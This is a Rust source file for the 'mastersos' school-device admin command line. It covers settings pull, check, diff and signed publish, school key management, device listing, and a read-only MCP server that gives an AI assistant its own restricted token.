//! The `mastersos` command line. Settings live in a local directory (`init`, `pull`, `check`,
//! `diff`, `publish`); the server holds no draft. The read commands that touch the server run the
//! same operations as the MCP tools ([`crate::call`]); `mastersos mcp` serves those tools.
//!
//! Output is a table or the text itself for people; `--json` prints the server's JSON for scripts and AI.

use std::path::{Path, PathBuf};
use std::process::ExitCode;

use clap::{Parser, Subcommand};
use serde::{Deserialize, Serialize};
use serde_json::{json, Map, Value};

use crate::publish::SignWith;
use crate::workdir::{self, Meta, Workdir};
use crate::{call, check_server, connect, serve_stdio, Api, OpError, Req, TokenUse};

const EXIT_CODES: &str = "Exit codes: 0 success; 1 failure (network, token, the server refused); \
2 `check` or `publish` found errors in the local settings (or `publish` found a secret rerouted without --allow-reroute).";

#[derive(Parser)]
#[command(
    name = "mastersos",
    version,
    about = "MastersOS admin command line: edit a school's settings in a local directory (pull, edit manifest.toml, check, diff) and publish them; inspect Devices.",
    after_help = EXIT_CODES
)]
pub struct Cli {
    // The defaults name the settings folder the way this platform writes it (spec 2026-11-04 §4.7)
    /// Admin server address, for example https://school.os.khundavid.com
    #[cfg_attr(
        not(windows),
        doc = "(default: `server` in ~/.config/mastersos/config.toml)"
    )]
    #[cfg_attr(
        windows,
        doc = r"(default: `server` in %APPDATA%\mastersos\config.toml)"
    )]
    #[arg(long, global = true)]
    server: Option<String>,
    /// File holding IT's own token (read and draft scopes, not an AI token), never accepted on the
    /// command line
    #[cfg_attr(
        not(windows),
        doc = "(default: `token_file` in the config file, else ~/.config/mastersos/token)"
    )]
    #[cfg_attr(
        windows,
        doc = r"(default: `token_file` in the config file, else %APPDATA%\mastersos\token)"
    )]
    #[arg(long, global = true)]
    token_file: Option<PathBuf>,
    /// File holding the AI token that only `mastersos mcp` uses
    #[cfg_attr(
        not(windows),
        doc = "(default: `ai_token_file` in the config file, else ~/.config/mastersos/ai-token)"
    )]
    #[cfg_attr(
        windows,
        doc = r"(default: `ai_token_file` in the config file, else %APPDATA%\mastersos\ai-token)"
    )]
    #[arg(long, global = true)]
    ai_token_file: Option<PathBuf>,
    /// Print the server's JSON instead of tables: for scripts and AI
    #[arg(long, global = true)]
    json: bool,
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Connect this computer to a school's admin server: paste the token from the Command line page; it is checked, then saved with the server address
    Connect {
        /// The admin server address, for example https://school.os.khundavid.com
        server_url: String,
    },
    /// Save --server, --token-file and --ai-token-file to config.toml in the settings folder, then test the connection
    #[command(hide = true)]
    Setup,
    /// Start a local settings directory for a school that has published nothing yet, approved by the school keys given
    Init {
        /// The directory to create (it must be empty or not exist)
        dir: PathBuf,
        /// A school key file; give it once for each school key (two is good). Make one with `mastersos-sign school-key new`, then register it with `mastersos-sign register`
        #[arg(long = "school-key", alias = "kit", value_name = "FILE")]
        school_key: Vec<PathBuf>,
    },
    /// Download the latest published settings (checked on this computer, version by version) into a local directory
    Pull {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
        /// Pull this published version instead of the latest
        #[arg(long)]
        version: Option<u64>,
        /// Overwrite local changes that are not published
        #[arg(long)]
        force: bool,
    },
    /// Check the local settings directory the way publishing would (no network)
    Check {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
    },
    /// Show what changed in the local settings directory since the last pull (no network; secrets by name only)
    Diff {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
    },
    /// Devices and their latest reports
    #[command(subcommand)]
    Devices(DevicesCmd),
    /// The Settings reference (Markdown): the short version, one section, or all of it
    Spec {
        /// One section: an issue code (icon_invalid), a table name (config, group, config.apps.web, school.oidc) or top-level
        #[arg(long)]
        section: Option<String>,
        /// The whole reference (long)
        #[arg(long, conflicts_with = "section")]
        full: bool,
    },
    /// Publish the local settings directory: check, fill in secrets, stamp, upload, then approve with the school key file (--school-key)
    Publish {
        /// The settings directory (default: the current directory)
        dir: Option<PathBuf>,
        /// The school key file (keep it on a USB stick; only you should be able to read it): check and approve on this computer. Required
        #[arg(long = "school-key", alias = "kit", value_name = "FILE")]
        kit: Option<PathBuf>,
        /// A PKCS#8 key file instead of the school key (kept for old scripts)
        #[arg(long, value_name = "FILE", conflicts_with = "kit", hide = true)]
        key: Option<PathBuf>,
        /// IT approves that secret NAME may go to its changed network (`secret_rerouted`); give it once per rerouted secret. Without it publish refuses. Never passed by an AI
        #[arg(long = "allow-reroute", value_name = "NAME")]
        allow_reroute: Vec<String>,
    },
    /// The school keys: list them, or add or remove one in the local settings directory
    #[command(subcommand)]
    Keys(KeysCmd),
    /// Read a password twice without echo and print its yescrypt hash for the IT account (it_account.password_hash)
    HashPassword,
    /// The school's logos
    #[command(subcommand)]
    Logo(LogoCmd),
    /// Serve read-only tools over MCP (stdio): read, check and diff the local settings directory (never its secrets), inspect Devices
    Mcp {
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
    },
}

#[derive(Subcommand)]
enum KeysCmd {
    /// List the school keys registered for this school: key code, label, registered date, whether the published settings and the local directory have them
    List {
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
    },
    /// Add the school key in FILE (registered with `mastersos-sign register`) to the local manifest.toml; then publish with a school key already in use
    Add {
        /// The school key file
        #[arg(value_name = "FILE")]
        file: PathBuf,
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
    },
    /// Remove the school key with this key code (for example 11d9-03eb) from the local manifest.toml; then publish
    Remove {
        /// The key code, with or without the dash
        #[arg(value_name = "KEY CODE")]
        code: String,
        /// That school key's file, if you still have it: then the disk-unlocking entry that belongs to it is removed too, even in an older manifest.toml
        #[arg(long = "school-key", alias = "kit", value_name = "FILE")]
        school_key: Option<PathBuf>,
        /// The settings directory (default: the current directory)
        #[arg(long)]
        dir: Option<PathBuf>,
    },
}

#[derive(Subcommand)]
enum LogoCmd {
    /// Check the sizes locally, upload both PNGs and print their sha256 and the [school] lines to paste
    Upload {
        /// The sign-in screen logo: 96 pixels high, 1 to 480 wide
        login: PathBuf,
        /// The icon: 40x40
        icon: PathBuf,
    },
}

#[derive(Subcommand)]
enum DevicesCmd {
    /// List Devices with their latest report
    List {
        /// Only Devices in this group
        #[arg(long)]
        group: Option<String>,
    },
    /// One Device's latest report (by device id or serial number)
    Show { device: String },
}

/// `~/.config/mastersos/config.toml`.
#[derive(Default, Deserialize, Serialize)]
struct ConfigFile {
    server: Option<String>,
    token_file: Option<PathBuf>,
    ai_token_file: Option<PathBuf>,
}

fn config_dir() -> Result<PathBuf, OpError> {
    mastersos_sign::platform::config_dir("mastersos").map_err(fail)
}

fn load_config() -> Result<ConfigFile, OpError> {
    let path = config_dir()?.join("config.toml");
    match std::fs::read_to_string(&path) {
        Ok(text) => toml::from_str(&text)
            .map_err(|e| OpError::Failed(format!("{} is not valid: {e}", path.display()))),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(ConfigFile::default()),
        Err(e) => Err(OpError::Failed(format!(
            "Could not read {}: {e}",
            path.display()
        ))),
    }
}

/// The command line's entry point.
pub async fn main() -> ExitCode {
    let cli = Cli::parse();
    let json = cli.json;
    match run(cli).await {
        Ok(code) => code,
        Err(e) => {
            if let OpError::Refused { message, issues } = &e {
                if json {
                    // Every refusal in the shape of the check's: {"written": false, "error", "issues"?}.
                    let mut v = json!({ "written": false, "error": message });
                    if let Some(i) = issues {
                        v["issues"] = Value::Array(i.clone());
                    }
                    println!("{v}");
                } else if let Some(i) = issues {
                    print_issues(i);
                }
            }
            // The message never holds the token: only scope names, the address and the server's error text.
            eprintln!("mastersos: {}", e.message());
            ExitCode::from(e.exit_code())
        }
    }
}

async fn run(cli: Cli) -> Result<ExitCode, OpError> {
    let Cli {
        server,
        token_file,
        ai_token_file,
        json,
        cmd,
    } = cli;
    if let Cmd::Connect { server_url } = &cmd {
        if server.is_some() || ai_token_file.is_some() {
            return Err(OpError::Failed(
                "`mastersos connect` takes the server address as its argument (`mastersos connect <SERVER_URL>`); --server and --ai-token-file are not used here"
                    .into(),
            ));
        }
        // Like setup: before the config file is read, so a broken one gets rewritten.
        return connect_school(server_url, token_file).await;
    }
    if let Cmd::Setup = cmd {
        // Before the config file is read: setup is how a broken one gets rewritten.
        return setup(server, token_file, ai_token_file).await;
    }
    // Offline commands: no server address, no token.
    match &cmd {
        Cmd::Check { dir } => return local_check(dir.as_deref(), json),
        Cmd::Diff { dir } => return local_diff(dir.as_deref()),
        // A directory with unpublished changes is refused before the network is touched.
        Cmd::Pull { dir, force, .. } => {
            let dir = dir.as_deref().unwrap_or_else(|| Path::new("."));
            Workdir::ensure_pullable(dir, *force).map_err(fail)?;
        }
        Cmd::HashPassword => return hash_password(),
        Cmd::Logo(LogoCmd::Upload { login, icon }) => {
            // Wrong sizes are refused before the config, the token or the network is touched.
            logo_body(login, icon)?;
        }
        // Only the local manifest.toml changes, and nothing from the server decides what.
        Cmd::Keys(KeysCmd::Remove {
            code,
            school_key,
            dir,
        }) => {
            return keys_remove(
                dir.as_deref(),
                code,
                school_key.as_deref(),
                server.as_deref(),
                token_file.as_deref(),
            )
            .await
        }
        Cmd::Init { school_key, .. } if school_key.is_empty() => {
            return Err(OpError::Failed(
                "mastersos init needs a school key file: --school-key <FILE>. Make one with: mastersos-sign school-key new --out <FOLDER> --school <name>, then register it with mastersos-sign register (the admin site's Tokens page gives the key token)."
                    .into(),
            ))
        }
        // Settings are approved on this computer with the school key; nothing is uploaded without it.
        Cmd::Publish {
            kit: None,
            key: None,
            ..
        } => {
            return Err(OpError::Failed(
                "Publishing needs the school key file: mastersos publish --school-key <FILE>"
                    .into(),
            ))
        }
        _ => {}
    }
    // School key files that cannot be read stop before the network.
    let school_keys = match &cmd {
        Cmd::Init { school_key, .. } => load_school_keys(school_key)?,
        Cmd::Keys(KeysCmd::Add { file, .. }) => load_school_keys(std::slice::from_ref(file))?,
        _ => Vec::new(),
    };
    // A kit or key file that is not private or does not parse stops before the network.
    let sign_with = match &cmd {
        Cmd::Publish { kit, key, .. } => signer(kit.as_deref(), key.as_deref())?,
        _ => None,
    };
    let cfg = load_config()?;
    let server = server.or(cfg.server).ok_or_else(|| {
        OpError::Failed(
            "No server address: run `mastersos setup --server https://<school>.os.khundavid.com` first, or pass --server"
                .into(),
        )
    })?;
    if let Cmd::Mcp { dir } = &cmd {
        // The AI gets its own token, never IT's.
        let ai_token_file = match ai_token_file.or(cfg.ai_token_file) {
            Some(p) => p,
            None => config_dir()?.join("ai-token"),
        };
        check_private(&ai_token_file, AI_TOKEN_AGAIN)?;
        let dir = dir.clone().unwrap_or_else(|| PathBuf::from("."));
        Workdir::open(&dir).map_err(fail)?;
        // The MCP server keeps its own exit codes: 2 for a token that must not be given to an AI.
        let api = match connect(&server, &ai_token_file, TokenUse::Ai).await {
            Ok(api) => api,
            Err(e) => {
                eprintln!("mastersos: {e}");
                return Ok(ExitCode::from(e.exit_code()));
            }
        };
        serve_stdio(api, dir, config_dir()?.join("pins"))
            .await
            .map_err(|e| OpError::Failed(format!("{e:#}")))?;
        return Ok(ExitCode::SUCCESS);
    }
    let token_file = match token_file.or(cfg.token_file) {
        Some(p) => p,
        None => config_dir()?.join("token"),
    };
    check_private(&token_file, TOKEN_AGAIN)?;
    // The commands that write settings (or upload them) refuse an AI token: it reads secrets as
    // "<kept>" and must not be able to publish.
    let wanted = match &cmd {
        Cmd::Init { .. }
        | Cmd::Pull { .. }
        | Cmd::Publish { .. }
        | Cmd::Logo(_)
        | Cmd::Keys(KeysCmd::Add { .. }) => TokenUse::It,
        _ => TokenUse::Any,
    };
    let api = connect(&server, &token_file, wanted)
        .await
        .map_err(|e| OpError::Failed(e.to_string()))?;
    let out = Out { json };
    match cmd {
        Cmd::Setup
        | Cmd::Connect { .. }
        | Cmd::Mcp { .. }
        | Cmd::Check { .. }
        | Cmd::Diff { .. }
        | Cmd::Keys(KeysCmd::Remove { .. }) => {
            unreachable!("handled above")
        }
        Cmd::Init { dir, .. } => init_dir(&api, &server, &token_file, &dir, &school_keys).await,
        Cmd::Pull {
            dir,
            version,
            force,
        } => {
            let dir = dir.unwrap_or_else(|| PathBuf::from("."));
            pull_dir(&api, &server, &token_file, &dir, version, force).await
        }
        Cmd::Devices(c) => devices(&api, &out, c).await,
        Cmd::Spec { section, full } => spec(&api, section, full).await,
        Cmd::Publish {
            dir, allow_reroute, ..
        } => {
            publish_dir(
                &api,
                &server,
                &token_file,
                dir.as_deref(),
                sign_with.ok_or_else(|| fail("no school key"))?,
                &allow_reroute,
                json,
            )
            .await
        }
        Cmd::Keys(KeysCmd::List { dir }) => keys_list(&api, &out, dir.as_deref()).await,
        Cmd::Keys(KeysCmd::Add { dir, .. }) => {
            keys_add(&api, &server, dir.as_deref(), &school_keys).await
        }
        Cmd::HashPassword => unreachable!("handled above"),
        Cmd::Logo(LogoCmd::Upload { login, icon }) => {
            let body = logo_body(&login, &icon)?;
            let text = api
                .send(Req::post_json(&["v1", "admin", "logos"], body))
                .await?;
            let v: Value = serde_json::from_str(&text).map_err(fail)?;
            if out.json {
                println!("{text}");
            } else {
                println!("{}", crate::logo::report(&v).map_err(OpError::Failed)?);
            }
            Ok(ExitCode::SUCCESS)
        }
    }
}

async fn setup(
    server: Option<String>,
    token_file: Option<PathBuf>,
    ai_token_file: Option<PathBuf>,
) -> Result<ExitCode, OpError> {
    let server = server.ok_or_else(|| {
        OpError::Failed("setup needs --server https://<school>.os.khundavid.com".into())
    })?;
    check_server(&server).map_err(|e| OpError::Failed(e.to_string()))?;
    let dir = config_dir()?;
    let absolute = |p: Option<PathBuf>, default: &str| -> Result<PathBuf, OpError> {
        match p {
            Some(p) => std::path::absolute(&p)
                .map_err(|e| OpError::Failed(format!("Bad token file path {}: {e}", p.display()))),
            None => Ok(dir.join(default)),
        }
    };
    let token_file = absolute(token_file, "token")?;
    let ai_token_file = absolute(ai_token_file, "ai-token")?;
    if token_file == ai_token_file {
        return Err(OpError::Failed(
            "IT's token file and the AI token file must be different files".into(),
        ));
    }
    for (f, again) in [(&token_file, TOKEN_AGAIN), (&ai_token_file, AI_TOKEN_AGAIN)] {
        if f.exists() {
            check_private(f, again)?;
        }
    }
    std::fs::create_dir_all(&dir)
        .map_err(|e| OpError::Failed(format!("Could not create {}: {e}", dir.display())))?;
    let path = dir.join("config.toml");
    let text = toml::to_string(&ConfigFile {
        server: Some(server.clone()),
        token_file: Some(token_file.clone()),
        ai_token_file: Some(ai_token_file.clone()),
    })
    .map_err(|e| OpError::Failed(format!("Could not write the config: {e}")))?;
    mastersos_sign::platform::write_private(&path, text.as_bytes()).map_err(fail)?;
    println!("Saved {}", path.display());
    for (file, wanted, what) in [
        (
            &token_file,
            TokenUse::It,
            "IT's own token for the command line: an API token with read and draft scopes from your operator or the admin web page",
        ),
        (
            &ai_token_file,
            TokenUse::Ai,
            "the AI token, used only by `mastersos mcp`: create it under AI tools on the school's admin page",
        ),
    ] {
        if !file.exists() {
            println!(
                "Next: save {what} to {}; only you should be able to read that file.",
                file.display()
            );
            continue;
        }
        let api = connect(&server, file, wanted)
            .await
            .map_err(|e| OpError::Failed(e.to_string()))?;
        let who = crate::whoami(&api)
            .await
            .map_err(|e| OpError::Failed(e.to_string()))?;
        println!(
            "{}: connected to {server} as {} (scopes: {})",
            file.display(),
            cell(&who["label"]),
            cell(&who["scopes"])
        );
    }
    println!("Never give an AI the token file {}.", token_file.display());
    Ok(ExitCode::SUCCESS)
}

/// `mastersos connect <SERVER_URL>`: ask for the token without echo, check it with `whoami`, then
/// save the token and `config.toml` (owner only). Nothing is written when the token is refused.
async fn connect_school(
    server_url: &str,
    token_file: Option<PathBuf>,
) -> Result<ExitCode, OpError> {
    let base = check_server(server_url).map_err(|e| OpError::Failed(e.to_string()))?;
    let token =
        mastersos_sign::platform::read_hidden_line("Paste the token from the Command line page: ")
            .map_err(fail)?;
    let token = token.trim();
    if token.is_empty() {
        return Err(OpError::Failed("No token was entered".into()));
    }
    let api = Api::new(server_url, token).map_err(|e| OpError::Failed(e.to_string()))?;
    let who = crate::whoami(&api)
        .await
        .map_err(|e| OpError::Failed(e.to_string()))?;
    if crate::is_ai_token(&who) {
        return Err(OpError::Failed(
            "This token is for an AI tool. Paste the token from the Command line page instead; nothing was saved"
                .into(),
        ));
    }
    let has = |name: &str| {
        who["scopes"]
            .as_array()
            .is_some_and(|a| a.iter().any(|s| s.as_str() == Some(name)))
    };
    if !has("read") || !has("draft") {
        return Err(OpError::Failed(
            "This token cannot read and edit settings. Create a new token on the Command line page; nothing was saved"
                .into(),
        ));
    }
    // The same check every later command applies to IT's token.
    crate::check_scopes(&who, TokenUse::It).map_err(|e| match e {
        crate::StartError::Refused(_) => OpError::Failed(
            "This token has more rights than the command line needs. Create a token with read and draft only; nothing was saved"
                .into(),
        ),
        other => OpError::Failed(other.to_string()),
    })?;
    let school: String = who["school_name"]
        .as_str()
        .map(|n| {
            n.chars()
                .filter(|c| !c.is_control())
                .take(64)
                .collect::<String>()
        })
        .filter(|n| !n.trim().is_empty())
        .unwrap_or_else(|| base.host_str().unwrap_or_default().to_owned());

    let dir = config_dir()?;
    let token_path = match token_file {
        Some(p) => std::path::absolute(&p)
            .map_err(|e| OpError::Failed(format!("Bad token file path {}: {e}", p.display())))?,
        None => dir.join("token"),
    };
    let config_path = dir.join("config.toml");
    // Keep the AI token file of an earlier setup; a broken old config is replaced.
    let ai_token_file = load_config().ok().and_then(|c| c.ai_token_file);
    let text = toml::to_string(&ConfigFile {
        server: Some(server_url.trim_end_matches('/').to_owned()),
        token_file: Some(token_path.clone()),
        ai_token_file,
    })
    .map_err(|e| OpError::Failed(format!("Could not write the settings: {e}")))?;
    for p in [&token_path, &config_path] {
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent).map_err(|e| {
                OpError::Failed(format!("Could not create {}: {e}", parent.display()))
            })?;
        }
    }
    mastersos_sign::platform::write_private(&token_path, format!("{token}\n").as_bytes())
        .map_err(fail)?;
    mastersos_sign::platform::write_private(&config_path, text.as_bytes()).map_err(fail)?;
    println!("Connected to {school}.");
    println!("Token saved in {}", token_path.display());
    println!("Settings saved in {}", config_path.display());
    Ok(ExitCode::SUCCESS)
}

/// The token file must be readable by its owner only.
fn check_private(path: &Path, again: &str) -> Result<(), OpError> {
    mastersos_sign::platform::check_private(path).map_err(|e| {
        let why = format!("{e:#}");
        OpError::Failed(format!("{}. {again}", why.trim_end_matches('.')))
    })
}

/// How to replace a token file that [`check_private`] refuses.
const TOKEN_AGAIN: &str = "Or save a new token file: run `mastersos connect <SERVER_URL>` again.";
const AI_TOKEN_AGAIN: &str =
    "Or save the AI token again: create it under AI tools on the school's admin page.";

async fn devices(api: &Api, out: &Out, c: DevicesCmd) -> Result<ExitCode, OpError> {
    match c {
        DevicesCmd::List { group } => {
            let mut args = Map::new();
            if let Some(g) = group {
                args.insert("group".into(), Value::String(g));
            }
            let text = call(api, "devices_list", Value::Object(args)).await?;
            out.print(&text, |v| {
                let rows = items(v)
                    .iter()
                    .map(|d| {
                        let mut state: Vec<&str> = Vec::new();
                        for (k, label) in [
                            ("behind", "behind"),
                            ("has_errors", "errors"),
                            ("locked", "locked"),
                            ("stale", "stale"),
                        ] {
                            if d[k] == true {
                                state.push(label);
                            }
                        }
                        vec![
                            cell(&d["device_id"]),
                            cell(&d["serial"]),
                            cell(&d["group"]),
                            cell(&d["bundle_version"]),
                            cell(&d["last_seen"]),
                            if state.is_empty() {
                                "ok".into()
                            } else {
                                state.join(",")
                            },
                        ]
                    })
                    .collect();
                table(
                    &["DEVICE", "SERIAL", "GROUP", "VERSION", "LAST SEEN", "STATE"],
                    rows,
                )
            });
        }
        DevicesCmd::Show { device } => {
            let text = call(api, "device_show", json!({ "device": device })).await?;
            let found: Value = serde_json::from_str(&text).unwrap_or(Value::Null);
            if out.json {
                println!("{found}");
            } else if let Value::Object(m) = &found {
                for (k, v) in m {
                    println!("{k}: {}", cell(v));
                }
            }
        }
    }
    Ok(ExitCode::SUCCESS)
}

async fn spec(api: &Api, section: Option<String>, full: bool) -> Result<ExitCode, OpError> {
    let text = if full {
        let body = api.send(Req::get(&["v1", "spec", "manifest"])).await?;
        let v: Value = serde_json::from_str(&body).unwrap_or(Value::Null);
        v["text"].as_str().map_or(body, str::to_owned)
    } else {
        let args = match section {
            Some(s) => json!({ "section": s }),
            None => json!({}),
        };
        call(api, "spec", args).await?
    };
    print!("{text}");
    if !text.ends_with('\n') {
        println!();
    }
    Ok(ExitCode::SUCCESS)
}

/// How results are printed.
struct Out {
    json: bool,
}

impl Out {
    /// The server's JSON with `--json`, else what `human` makes of it.
    fn print(&self, text: &str, human: impl FnOnce(&Value) -> String) {
        if self.json {
            println!("{text}");
        } else {
            let v: Value = serde_json::from_str(text).unwrap_or(Value::Null);
            println!("{}", human(&v));
        }
    }
}

fn items(v: &Value) -> &[Value] {
    v.as_array().map_or(&[], Vec::as_slice)
}

/// One value for a table cell or a line.
fn cell(v: &Value) -> String {
    match v {
        Value::Null => "-".into(),
        Value::String(s) => s.clone(),
        Value::Array(a) => a.iter().map(cell).collect::<Vec<_>>().join(", "),
        other => other.to_string(),
    }
}

fn table(headers: &[&str], rows: Vec<Vec<String>>) -> String {
    let mut widths: Vec<usize> = headers.iter().map(|h| h.chars().count()).collect();
    for r in &rows {
        for (w, c) in widths.iter_mut().zip(r) {
            *w = (*w).max(c.chars().count());
        }
    }
    let line = |cells: Vec<&str>| {
        let mut s = String::new();
        for (i, (c, w)) in cells.iter().zip(&widths).enumerate() {
            if i + 1 == cells.len() {
                s.push_str(c);
            } else {
                s.push_str(c);
                s.push_str(&" ".repeat(w - c.chars().count() + 2));
            }
        }
        s.trim_end().to_owned()
    };
    let mut out = vec![line(headers.to_vec())];
    out.extend(
        rows.iter()
            .map(|r| line(r.iter().map(String::as_str).collect())),
    );
    out.join("\n")
}

fn fail(e: impl std::fmt::Display) -> OpError {
    OpError::Failed(format!("{e:#}"))
}

/// The settings directory, its base checked against this computer's pins.
fn open_dir(dir: Option<&Path>) -> Result<Workdir, OpError> {
    Ok(Workdir::open(dir.unwrap_or_else(|| Path::new(".")))
        .map_err(fail)?
        .with_pins(config_dir()?.join("pins")))
}

fn lint_values(lints: &[mastersos_bundle::Lint]) -> Vec<Value> {
    lints
        .iter()
        .map(|l| serde_json::to_value(l).unwrap_or(Value::Null))
        .collect()
}

/// What `mastersos check` prints after the issues when secrets are rerouted: publishing stops
/// on them until IT approves each one by name.
fn reroute_notice(lints: &[mastersos_bundle::Lint]) -> Option<String> {
    // `rerouted_names` keeps only valid names (a-z, 0-9, -); checked again here because the
    // names go into a command IT may paste.
    let names = mastersos_bundle::secret_ref::rerouted_names(lints);
    if names.is_empty()
        || !names
            .iter()
            .all(|n| mastersos_bundle::secret_ref::is_valid_name(n))
    {
        return None;
    }
    let names: Vec<String> = names.into_iter().collect();
    let flags: Vec<String> = names
        .iter()
        .map(|n| format!("--allow-reroute={n}"))
        .collect();
    Some(format!(
        "\n!! SECRET REROUTED: {} would be sent to a changed network.\n!! `mastersos publish` refuses until IT checks the change (`mastersos diff`) and approves it:\n!!   mastersos publish {}\n!! Only IT decides this; an AI assistant never passes --allow-reroute.",
        names.join(", "),
        flags.join(" ")
    ))
}

/// `mastersos check`: the lints of the local directory; exit code 2 when any is an error.
fn local_check(dir: Option<&Path>, json: bool) -> Result<ExitCode, OpError> {
    let lints = workdir::check(&open_dir(dir)?).map_err(fail)?;
    if json {
        // The same shape as the MCP `check` tool.
        println!("{}", crate::tools::check_result(&lints));
    } else {
        print_issues(&lint_values(&lints));
        if let Some(n) = reroute_notice(&lints) {
            println!("{n}");
        }
    }
    Ok(if mastersos_bundle::has_errors(&lints) {
        ExitCode::from(2)
    } else {
        ExitCode::SUCCESS
    })
}

/// `mastersos diff`.
fn local_diff(dir: Option<&Path>) -> Result<ExitCode, OpError> {
    print!("{}", workdir::diff(&open_dir(dir)?).map_err(fail)?);
    Ok(ExitCode::SUCCESS)
}

/// The school id the server says this token belongs to.
async fn school_id(api: &Api) -> Result<String, OpError> {
    Ok(school_info(api, "").await?.0)
}

/// The school id and name the server says this token belongs to (the name for messages only; the
/// host when there is none).
async fn school_info(api: &Api, server: &str) -> Result<(String, String), OpError> {
    let text = api.send(Req::get(&["v1", "auth", "config"])).await?;
    let v: Value = serde_json::from_str(&text).map_err(fail)?;
    let id = v["school_id"]
        .as_str()
        .map(str::to_owned)
        .ok_or_else(|| OpError::Failed("the server did not say which school this is".into()))?;
    let name = v["name"]
        .as_str()
        .map(|n| {
            n.chars()
                .filter(|c| !c.is_control())
                .take(64)
                .collect::<String>()
        })
        .filter(|n| !n.trim().is_empty())
        .unwrap_or_else(|| {
            reqwest::Url::parse(server)
                .ok()
                .and_then(|u| u.host_str().map(str::to_owned))
                .unwrap_or_else(|| "this school".to_owned())
        });
    Ok((id, name))
}

fn sign_api(server: &str, token_file: &Path) -> Result<mastersos_sign::Api, OpError> {
    mastersos_sign::Api::from_token_file(server, token_file).map_err(fail)
}

/// Whether two server addresses name the same server: compared as URLs (scheme, host in lower
/// case, port, path without a trailing `/`), not as text.
fn same_server(a: &str, b: &str) -> bool {
    fn norm(s: &str) -> Option<(String, String, Option<u16>, String)> {
        let u = reqwest::Url::parse(s.trim()).ok()?;
        Some((
            u.scheme().to_owned(),
            u.host_str()?.to_ascii_lowercase(),
            u.port_or_known_default(),
            u.path().trim_end_matches('/').to_owned(),
        ))
    }
    match (norm(a), norm(b)) {
        (Some(x), Some(y)) => x == y,
        _ => a == b,
    }
}

/// `mastersos init <dir> --school-key <FILE>…`: the trusted keys and the disk-unlocking
/// recipients come from the school key files only; the server is asked only whether each is
/// registered for this school. Nothing is written when one is not.
async fn init_dir(
    api: &Api,
    server: &str,
    token_file: &Path,
    dir: &Path,
    school_keys: &[SchoolKey],
) -> Result<ExitCode, OpError> {
    let (id, name) = school_info(api, server).await?;
    let latest = sign_api(server, token_file)?
        .latest_version()
        .await
        .map_err(fail)?;
    if latest > 0 {
        return Err(OpError::Failed(format!(
            "the school already has published settings (version {latest}): use `mastersos pull {}`",
            dir.display()
        )));
    }
    ensure_registered(api, school_keys, &name).await?;
    let keys: Vec<(mastersos_bundle::TrustKey, String)> = school_keys
        .iter()
        .map(|k| (k.kit.trust_key(), k.kit.escrow_recipient()))
        .collect();
    let text =
        workdir::set_trusted_keys(&workdir::template(&id).map_err(fail)?, &keys).map_err(fail)?;
    let meta = Meta {
        server: server.to_owned(),
        school_id: id,
        base_version: 0,
    };
    Workdir::init(dir, meta, &text).map_err(fail)?;
    let abs = absolute(dir)?;
    println!("Created {} for {name}.", abs.display());
    println!("  manifest.toml  the settings for every computer: edit this file");
    println!(
        "  secrets.toml   Wi-Fi passwords and other secrets that manifest.toml names as \"secret:<name>\"; keep it private"
    );
    println!("{}", trusted_line(&text)?);
    println!("Next: edit manifest.toml, then run `mastersos check`.");
    Ok(ExitCode::SUCCESS)
}

/// A school key file read for `init` or `keys add`.
struct SchoolKey {
    kit: mastersos_bundle::kit::Kit,
}

impl SchoolKey {
    fn code(&self) -> String {
        workdir::shown_code(&self.kit.key_id())
    }
}

/// Read the school key files (one key given twice counts once).
fn load_school_keys(paths: &[PathBuf]) -> Result<Vec<SchoolKey>, OpError> {
    let mut out: Vec<SchoolKey> = Vec::new();
    for p in paths {
        let kit = mastersos_sign::kit::load_kit(p).map_err(fail)?;
        if !out.iter().any(|k| k.kit.key_id() == kit.key_id()) {
            out.push(SchoolKey { kit });
        }
    }
    Ok(out)
}

/// `GET /v1/admin/signing-keys`, as far as the command line reads it.
#[derive(Deserialize)]
struct ListedKey {
    key_id: String,
    #[serde(default)]
    alg: String,
    #[serde(default)]
    public_key: String,
    #[serde(default)]
    label: String,
    #[serde(default)]
    created_at: Option<String>,
    #[serde(default)]
    in_published_trust: bool,
}

/// `GET /v1/admin/escrow-recipients`, as far as the command line reads it.
#[derive(Deserialize)]
struct ListedRecipient {
    recipient: String,
    #[serde(default)]
    bound_key_id: Option<String>,
}

async fn get_list<T: serde::de::DeserializeOwned>(
    api: &Api,
    what: &str,
) -> Result<Vec<T>, OpError> {
    let text = api.send(Req::get(&["v1", "admin", what])).await?;
    serde_json::from_str(&text)
        .map_err(|e| OpError::Failed(format!("the server's list of {what} cannot be read: {e}")))
}

/// Every school key must be registered for this school: its public key among the registered
/// signing keys (compared by key, not by id or label) and its recipient among the registered
/// recipients. The server's lists only answer yes or no; nothing from them is written.
async fn ensure_registered(
    api: &Api,
    school_keys: &[SchoolKey],
    school: &str,
) -> Result<(), OpError> {
    let keys: Vec<ListedKey> = get_list(api, "signing-keys").await?;
    let recipients: Vec<ListedRecipient> = get_list(api, "escrow-recipients").await?;
    for k in school_keys {
        let tk = k.kit.trust_key();
        let recipient = k.kit.escrow_recipient();
        let key_ok = keys
            .iter()
            .any(|l| l.alg == tk.alg.as_str() && l.public_key == tk.public_key);
        let recipient_ok = recipients.iter().any(|r| r.recipient == recipient);
        if !key_ok || !recipient_ok {
            return Err(OpError::Failed(format!(
                "This school key ({}) is not registered for {school}. Register it first with `mastersos-sign register` (the admin site's Tokens page gives the key token).",
                k.code()
            )));
        }
    }
    Ok(())
}

fn absolute(p: &Path) -> Result<PathBuf, OpError> {
    std::path::absolute(p).map_err(|e| OpError::Failed(format!("Bad path {}: {e}", p.display())))
}

/// `Trusted keys: 11d9-03eb, 7c42-a915` for this manifest.
fn trusted_line(manifest_text: &str) -> Result<String, OpError> {
    let codes: Vec<String> = workdir::trusted_keys(manifest_text)
        .map_err(fail)?
        .iter()
        .map(|k| workdir::shown_code(&k.id))
        .collect();
    Ok(format!("Trusted keys: {}", codes.join(", ")))
}

